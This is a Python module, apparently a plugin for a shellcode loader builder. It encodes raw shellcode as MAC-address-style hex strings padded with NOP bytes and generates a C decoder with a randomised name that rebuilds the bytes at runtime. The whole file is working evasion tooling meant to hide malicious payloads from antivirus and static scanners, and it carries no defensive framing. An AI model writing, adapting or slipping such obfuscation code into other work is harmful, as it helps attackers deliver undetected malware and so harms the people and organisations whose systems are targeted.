import random
import string

class MACObfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = 0
        for i in range(0, len(decoded), 6):
            chunk = decoded[i:i+6]
            if len(chunk) < 6:
                chunk = chunk + (b"\x90" * (6 - len(chunk)))
            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
            self.size += 1
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
unsigned char * {self.name}(const unsigned char *encoded[])
{{
    int size = {self.size};
    unsigned char *out = malloc(size*6);
    for (int i=0; i<size; i++){{
        char *mutable = strdup(encoded[i]);
        char *myPtr = strtok(mutable, "-");
        for (int j=0; j<6; j++){{
            out[i*6+j] = strtol(myPtr, NULL, 16);
            myPtr = strtok(NULL, "-");
        }}
    }}

    return out;
}}
"""